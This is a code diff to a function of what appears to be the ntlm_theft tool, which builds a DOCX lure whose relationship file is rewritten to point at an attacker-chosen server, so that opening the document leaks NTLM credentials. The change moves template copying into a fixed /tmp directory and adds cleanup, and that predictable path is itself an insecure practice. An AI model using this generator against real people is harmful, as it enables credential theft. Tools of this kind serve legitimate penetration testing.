@@ -142,20 +142,36 @@ def create_htm(generate, server, filename):
 
 
 def create_docx_includepicture(generate, server, filename):
+    # Source path (read-only in Nix store)
     src = os.path.join(script_directory, "templates", "docx-includepicture-template")
-    with tempfile.TemporaryDirectory() as temp_dir:
-        dest = os.path.join(temp_dir, "docx-includepicture-template")
+    
+    # Explicitly create a writable temporary directory in /tmp
+    temp_dir = os.path.join("/tmp", "ntlm_theft_temp")
+    if not os.path.exists(temp_dir):
+        os.makedirs(temp_dir, exist_ok=True)  # Create the directory with proper permissions
+    
+    dest = os.path.join(temp_dir, "docx-includepicture-template")
+    
+    try:
+        # Copy the template to the writable temporary directory
         shutil.copytree(src, dest)
+        
+        # Modify the document.xml.rels file in the temporary directory
         documentfilename = os.path.join(dest, "word", "_rels", "document.xml.rels")
         with open(documentfilename, 'r') as file:
             filedata = file.read()
         filedata = filedata.replace('127.0.0.1', server)
         with open(documentfilename, 'w') as file:
             file.write(filedata)
+        
+        # Create the .docx archive from the modified template
         shutil.make_archive(filename, 'zip', dest)
         os.rename(filename + ".zip", filename)
-    print(f"Created: {filename} (OPEN)")
-
+        print(f"Created: {filename} (OPEN)")
+    finally:
+        # Clean up the temporary directory
+        if os.path.exists(temp_dir):
+            shutil.rmtree(temp_dir)
 
 def create_docx_remote_template(generate, server, filename):
     src = os.path.join(script_directory, "templates", "docx-remotetemplate-template")
